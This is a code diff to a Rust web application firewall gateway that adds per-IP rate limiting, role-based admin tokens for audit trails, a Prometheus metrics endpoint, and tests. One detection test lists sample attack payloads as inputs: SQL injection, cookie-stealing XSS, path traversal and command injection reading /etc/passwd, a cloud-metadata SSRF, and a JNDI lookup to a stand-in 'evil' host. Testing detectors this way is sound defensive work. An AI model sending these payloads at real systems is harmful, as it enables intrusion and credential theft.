@@ -8,8 +8,9 @@ use axum::{
 };
 use serde::{Deserialize, Serialize};
 use std::{
+    collections::HashMap,
     io::ErrorKind,
-    net::IpAddr,
+    net::{IpAddr, Ipv4Addr},
     path::{Path, PathBuf},
     sync::Arc,
     time::{SystemTime, UNIX_EPOCH},
@@ -20,10 +21,10 @@ use tokio::{
 };
 use waf_ids_core::{
     AppData, BLOCK_SCORE, buyer_evidence_manifest_at, commercial_readiness_snapshot_at,
-    enforce_event_limit, kpi_snapshot_at, record_audit_log, select_route,
-    threat_feed_freshness_snapshot, upsert_dnsbl, upsert_route, upsert_threat, upsert_threat_feed,
-    validate_commercial_profile, validate_dnsbl, validate_route, validate_threat,
-    validate_threat_feed_import,
+    enforce_event_limit, kpi_snapshot_at, prometheus_exposition, rate_limit_step, record_audit_log,
+    select_route, threat_feed_freshness_snapshot, upsert_dnsbl, upsert_route, upsert_threat,
+    upsert_threat_feed, validate_commercial_profile, validate_dnsbl, validate_route,
+    validate_threat, validate_threat_feed_import,
 };
 pub use waf_ids_core::{
     AuditLogEntry, BuyerEvidenceEndpoint, BuyerEvidenceManifest, BuyerEvidenceRuntimeCounts,
@@ -40,9 +41,17 @@ pub struct AppState {
     persist_lock: Arc<Mutex<()>>,
     http: reqwest::Client,
     admin_token: Option<String>,
+    // RBAC: multiple admin tokens each mapped to an actor name for audit trails.
+    // Empty falls back to the single `admin_token`. Never logged as the actor.
+    admin_tokens: HashMap<String, String>,
     state_path: Option<PathBuf>,
     dnsbl_origin: String,
     event_limit: usize,
+    // Ephemeral per-client-IP fixed-window counters (not persisted).
+    // ponytail: unbounded map — add TTL eviction if client-IP cardinality grows.
+    rate_limiter: Arc<Mutex<HashMap<IpAddr, (u64, u32)>>>,
+    rate_limit: u32,
+    rate_limit_window: u64,
 }
 
 impl AppState {
@@ -69,10 +78,60 @@ impl AppState {
             persist_lock: Arc::new(Mutex::new(())),
             http: reqwest::Client::new(),
             admin_token: config.admin_token,
+            admin_tokens: HashMap::new(),
             state_path: config.state_path,
             dnsbl_origin: normalized_origin(&config.dnsbl_origin),
             event_limit: config.event_limit.max(1),
+            rate_limiter: Arc::new(Mutex::new(HashMap::new())),
+            rate_limit: 0,
+            rate_limit_window: 60,
         }
+    }
+
+    /// Enable per-client-IP rate limiting: at most `limit` gateway requests per
+    /// `window_secs`. `limit == 0` disables it (the default). Builder-style so
+    /// callers keep using [`AppConfig`] unchanged.
+    pub fn with_rate_limit(mut self, limit: u32, window_secs: u64) -> Self {
+        self.rate_limit = limit;
+        self.rate_limit_window = window_secs.max(1);
+        self
+    }
+
+    /// Configure RBAC admin tokens (token -> actor name). A non-empty map takes
+    /// precedence over the single `admin_token`. Builder-style.
+    pub fn with_admin_tokens(mut self, tokens: HashMap<String, String>) -> Self {
+        self.admin_tokens = tokens;
+        self
+    }
+
+    /// The actor name mapped to the request's `X-Admin-Token`, if that token is a
+    /// configured RBAC token.
+    fn actor_for_token(&self, headers: &HeaderMap) -> Option<String> {
+        headers
+            .get("x-admin-token")
+            .and_then(|value| value.to_str().ok())
+            .and_then(|token| self.admin_tokens.get(token).cloned())
+    }
+
+    /// Records one gateway request for `client_ip` and returns `true` if it is
+    /// within the configured rate limit. Unknown IPs share one bucket.
+    async fn allow_request(&self, client_ip: Option<IpAddr>) -> bool {
+        if self.rate_limit == 0 {
+            return true;
+        }
+        let key = client_ip.unwrap_or(IpAddr::V4(Ipv4Addr::UNSPECIFIED));
+        let now = now_unix();
+        let mut map = self.rate_limiter.lock().await;
+        let (window_start, count) = map.get(&key).copied().unwrap_or((now, 0));
+        let (allowed, new_start, new_count) = rate_limit_step(
+            now,
+            window_start,
+            count,
+            self.rate_limit,
+            self.rate_limit_window,
+        );
+        map.insert(key, (new_start, new_count));
+        allowed
     }
 
     async fn mutate_and_persist<T>(
@@ -247,6 +306,7 @@ pub fn build_app(state: AppState) -> Router {
         .route("/api/audit-logs", get(list_audit_logs))
         .route("/api/events.ndjson", get(events_ndjson))
         .route("/api/kpis", get(kpis))
+        .route("/metrics", get(metrics))
         .route(
             "/api/commercial/license",
             get(get_commercial_license).post(update_commercial_license),
@@ -298,7 +358,7 @@ async fn create_route(
         return error(StatusCode::BAD_REQUEST, message);
     }
 
-    let actor = audit_actor(&headers);
+    let actor = audit_actor(&state, &headers);
     match state
         .mutate_and_persist(|data| {
             let saved = upsert_route(&mut data.routes, route.clone());
@@ -328,7 +388,7 @@ async fn create_threat(
         return error(StatusCode::BAD_REQUEST, message);
     }
 
-    let actor = audit_actor(&headers);
+    let actor = audit_actor(&state, &headers);
     match state
         .mutate_and_persist(|data| {
             let saved = upsert_threat(&mut data.threats, indicator.clone());
@@ -364,7 +424,7 @@ async fn create_dnsbl(
         return error(StatusCode::BAD_REQUEST, message);
     }
 
-    let actor = audit_actor(&headers);
+    let actor = audit_actor(&state, &headers);
     match state
         .mutate_and_persist(|data| {
             let saved = upsert_dnsbl(&mut data.dnsbl, entry.clone());
@@ -397,6 +457,20 @@ async fn kpis(State(state): State<AppState>) -> Json<SocKpiSnapshot> {
     Json(kpi_snapshot_at(&data, now_unix()))
 }
 
+async fn metrics(State(state): State<AppState>) -> impl IntoResponse {
+    let body = {
+        let data = state.inner.read().await;
+        prometheus_exposition(&kpi_snapshot_at(&data, now_unix()))
+    };
+    (
+        [(
+            axum::http::header::CONTENT_TYPE,
+            "text/plain; version=0.0.4; charset=utf-8",
+        )],
+        body,
+    )
+}
+
 async fn get_commercial_license(State(state): State<AppState>) -> Json<CommercialProfile> {
     Json(state.inner.read().await.commercial.clone())
 }
@@ -413,7 +487,7 @@ async fn update_commercial_license(
         return error(StatusCode::BAD_REQUEST, message);
     }
 
-    let actor = audit_actor(&headers);
+    let actor = audit_actor(&state, &headers);
     match state
         .mutate_and_persist(|data| {
             data.commercial = profile.clone();
@@ -470,7 +544,7 @@ async fn import_threat_feed(
     }
 
     let imported_at = now_unix();
-    let actor = audit_actor(&headers);
+    let actor = audit_actor(&state, &headers);
     match state
         .mutate_and_persist(|data| {
             for threat in feed.threats.iter().cloned() {
@@ -589,6 +663,34 @@ async fn gateway(
     };
 
     let client_ip = client_ip_from_headers(&headers);
+
+    // Rate limiting runs before scoring/proxying so floods are shed cheaply.
+    if !state.allow_request(client_ip).await {
+        record_event(
+            &state,
+            client_ip,
+            Some(route.id.clone()),
+            "rate_limited",
+            format!(
+                "rate limit exceeded ({} requests per {}s)",
+                state.rate_limit, state.rate_limit_window
+            ),
+            0,
+            gateway_path,
+        )
+        .await;
+        return (
+            StatusCode::TOO_MANY_REQUESTS,
+            Json(serde_json::json!({
+                "action": "rate_limited",
+                "route_id": route.id,
+                "limit": state.rate_limit,
+                "window_seconds": state.rate_limit_window
+            })),
+        )
+            .into_response();
+    }
+
     let body_text = String::from_utf8_lossy(&body);
     let scored = score_request(
         gateway_path,
@@ -755,16 +857,26 @@ async fn record_event(
 }
 
 fn admin_authorized(state: &AppState, headers: &HeaderMap) -> bool {
+    let presented = headers
+        .get("x-admin-token")
+        .and_then(|value| value.to_str().ok());
+    // RBAC tokens take precedence when configured.
+    if !state.admin_tokens.is_empty() {
+        return presented.is_some_and(|token| state.admin_tokens.contains_key(token));
+    }
+    // Fallback: single shared token (None means auth is disabled).
     let Some(expected) = state.admin_token.as_deref() else {
         return true;
     };
-    headers
-        .get("x-admin-token")
-        .and_then(|value| value.to_str().ok())
-        .is_some_and(|actual| actual == expected)
+    presented.is_some_and(|actual| actual == expected)
 }
 
-fn audit_actor(headers: &HeaderMap) -> String {
+fn audit_actor(state: &AppState, headers: &HeaderMap) -> String {
+    // Prefer the actor bound to the presented RBAC token, then an explicit
+    // actor header, then a generic label. The token itself is never logged.
+    if let Some(actor) = state.actor_for_token(headers) {
+        return actor;
+    }
     headers
         .get("x-admin-actor")
         .and_then(|value| value.to_str().ok())
@@ -772,6 +884,25 @@ fn audit_actor(headers: &HeaderMap) -> String {
         .filter(|value| !value.is_empty())
         .unwrap_or("admin-token")
         .to_string()
+}
+
+/// Parses an `ADMIN_TOKENS` string into a token -> actor map. Format is
+/// comma-separated `token` or `token:actor` items; an item without an explicit
+/// actor is labelled `admin`. Blank items and blank tokens are ignored.
+pub fn parse_admin_tokens(raw: &str) -> HashMap<String, String> {
+    raw.split(',')
+        .filter_map(|item| {
+            let (token, actor) = match item.split_once(':') {
+                Some((token, actor)) => (token.trim(), actor.trim()),
+                None => (item.trim(), ""),
+            };
+            if token.is_empty() {
+                return None;
+            }
+            let actor = if actor.is_empty() { "admin" } else { actor };
+            Some((token.to_string(), actor.to_string()))
+        })
+        .collect()
 }
 
 fn record_successful_audit_log(
@@ -1141,9 +1272,116 @@ mod tests {
             .unwrap()
     }
 
+    fn gateway_get_from_ip(uri: &str, ip: &str) -> Request<Body> {
+        Request::builder()
+            .method(Method::GET)
+            .uri(uri)
+            .header("x-forwarded-for", ip)
+            .body(Body::empty())
+            .unwrap()
+    }
+
+    #[test]
+    fn rate_limit_step_enforces_fixed_window() {
+        // limit 0 disables limiting entirely.
+        assert_eq!(rate_limit_step(100, 0, 999, 0, 60), (true, 0, 999));
+        // First request in a fresh window is allowed and counted.
+        assert_eq!(rate_limit_step(100, 100, 0, 2, 60), (true, 100, 1));
+        // Second allowed; third (at the limit) rejected without advancing count.
+        assert_eq!(rate_limit_step(100, 100, 1, 2, 60), (true, 100, 2));
+        assert_eq!(rate_limit_step(100, 100, 2, 2, 60), (false, 100, 2));
+        // Once the window elapses the counter resets.
+        assert_eq!(rate_limit_step(160, 100, 2, 2, 60), (true, 160, 1));
+    }
+
+    #[tokio::test]
+    async fn gateway_rate_limits_per_client_ip() {
+        let app = build_app(AppState::seeded(None).with_rate_limit(2, 60));
+
+        // Two requests from one IP pass; the third exceeds the budget.
+        for i in 0..2 {
+            let resp = app_request(&app, gateway_get_from_ip("/gateway/demo", "203.0.113.9")).await;
+            assert_eq!(resp.status(), StatusCode::OK, "request {i} should pass");
+        }
+        let blocked = app_request(&app, gateway_get_from_ip("/gateway/demo", "203.0.113.9")).await;
+        assert_eq!(blocked.status(), StatusCode::TOO_MANY_REQUESTS);
+
+        // A different client IP keeps its own independent budget.
+        let other = app_request(&app, gateway_get_from_ip("/gateway/demo", "198.51.100.7")).await;
+        assert_eq!(other.status(), StatusCode::OK);
+    }
+
     async fn body_text(response: Response) -> String {
         let bytes = to_bytes(response.into_body(), usize::MAX).await.unwrap();
         String::from_utf8(bytes.to_vec()).unwrap()
+    }
+
+    #[test]
+    fn prometheus_exposition_emits_typed_gauges() {
+        let text = prometheus_exposition(&kpi_snapshot_at(&AppData::seeded(), 0));
+        // HELP/TYPE metadata plus a value line for a representative metric.
+        assert!(text.contains("# TYPE waf_ids_routes gauge"));
+        assert!(text.contains("waf_ids_routes 1")); // seed has one route
+        assert!(text.contains("waf_ids_dnsbl_entries 1")); // seed has one DNSBL entry
+        assert!(text.contains("waf_ids_security_events 0"));
+        assert!(text.contains("waf_ids_security_events_blocked 0"));
+    }
+
+    #[tokio::test]
+    async fn metrics_endpoint_serves_prometheus_text() {
+        let app = build_app(AppState::seeded(None));
+        let response = app_request(&app, empty_request(Method::GET, "/metrics")).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        let content_type = response
+            .headers()
+            .get("content-type")
+            .and_then(|value| value.to_str().ok())
+            .unwrap_or_default()
+            .to_string();
+        assert!(
+            content_type.starts_with("text/plain"),
+            "unexpected content-type: {content_type}"
+        );
+        let body = body_text(response).await;
+        assert!(body.contains("waf_ids_security_events_blocked"));
+    }
+
+    #[test]
+    fn parse_admin_tokens_maps_tokens_to_actors() {
+        let map = parse_admin_tokens("tokA:alice, tokB:bob ,tokC, ,:noname, tokD:");
+        assert_eq!(map.get("tokA").map(String::as_str), Some("alice"));
+        assert_eq!(map.get("tokB").map(String::as_str), Some("bob"));
+        // No explicit actor, or an empty actor, is labelled "admin".
+        assert_eq!(map.get("tokC").map(String::as_str), Some("admin"));
+        assert_eq!(map.get("tokD").map(String::as_str), Some("admin"));
+        // Blank items and blank tokens (":noname") are ignored.
+        assert_eq!(map.len(), 4);
+    }
+
+    #[test]
+    fn rbac_tokens_authorize_and_name_the_actor() {
+        let mut tokens = HashMap::new();
+        tokens.insert("tokA".to_string(), "alice".to_string());
+        let state = AppState::seeded(None).with_admin_tokens(tokens);
+
+        let mut valid = HeaderMap::new();
+        valid.insert("x-admin-token", "tokA".parse().unwrap());
+        assert!(admin_authorized(&state, &valid));
+        assert_eq!(audit_actor(&state, &valid), "alice");
+
+        // A token not in the RBAC set is rejected, and never used as the actor.
+        let mut wrong = HeaderMap::new();
+        wrong.insert("x-admin-token", "nope".parse().unwrap());
+        assert!(!admin_authorized(&state, &wrong));
+        assert_eq!(audit_actor(&state, &wrong), "admin-token");
+
+        // Missing token header is unauthorized under RBAC.
+        assert!(!admin_authorized(&state, &HeaderMap::new()));
+
+        // Without a matching RBAC token, audit_actor honours X-Admin-Actor.
+        let mut named = HeaderMap::new();
+        named.insert("x-admin-actor", "carol".parse().unwrap());
+        assert_eq!(audit_actor(&state, &named), "carol");
     }
 
     async fn json_body<T: DeserializeOwned>(response: Response) -> T {
@@ -1223,14 +1461,16 @@ mod tests {
 
     #[test]
     fn scores_threat_indicator_matches() {
+        // Uses a site-specific IoC that does NOT overlap a built-in signature,
+        // so this isolates the operator-configured indicator path.
         let score = score_request(
-            "/login",
-            Some("q=UNION%20SELECT%20password"),
+            "/callback",
+            Some("id=EVILCORP-C2-BEACON"),
             "",
             None,
             &[ThreatIndicator {
-                value: "union select".to_string(),
-                indicator_type: "sqli".to_string(),
+                value: "evilcorp-c2-beacon".to_string(),
+                indicator_type: "c2".to_string(),
                 severity: Severity::High,
                 source: "unit".to_string(),
                 ttl_seconds: 60,
@@ -1239,7 +1479,52 @@ mod tests {
         );
 
         assert_eq!(score.score, 50);
-        assert!(score.reason.contains("sqli indicator"));
+        assert!(score.reason.contains("c2 indicator"));
+    }
+
+    #[test]
+    fn builtin_waf_detects_common_attack_classes_without_configuration() {
+        // No operator-configured indicators and no DNSBL: every detection below
+        // must come from the built-in OWASP-shape signature layer alone.
+        let cases = [
+            ("/products", "id=1 UNION SELECT password FROM users", "sqli"),
+            (
+                "/search",
+                "q=<script>alert(document.cookie)</script>",
+                "xss",
+            ),
+            ("/download", "file=../../../../etc/passwd", "path-traversal"),
+            (
+                "/ping",
+                "host=127.0.0.1; cat /etc/passwd",
+                "command-injection",
+            ),
+            (
+                "/fetch",
+                "url=http://169.254.169.254/latest/meta-data",
+                "ssrf",
+            ),
+            ("/lookup", "x=${jndi:ldap://evil/a}", "deserialization"),
+        ];
+        for (path, query, class) in cases {
+            let scored = score_request(path, Some(query), "", None, &[], &[]);
+            assert!(
+                scored.score >= BLOCK_SCORE,
+                "{class} payload should reach block score, got {} ({})",
+                scored.score,
+                scored.reason
+            );
+            assert!(
+                scored.reason.contains(class),
+                "reason should name the {class} class, got: {}",
+                scored.reason
+            );
+        }
+
+        // A benign request must not be flagged by the built-in layer.
+        let benign = score_request("/account/profile", Some("tab=settings"), "", None, &[], &[]);
+        assert_eq!(benign.score, 0, "benign request scored: {}", benign.reason);
+        assert_eq!(benign.reason, "no matching indicator");
     }
 
     #[test]
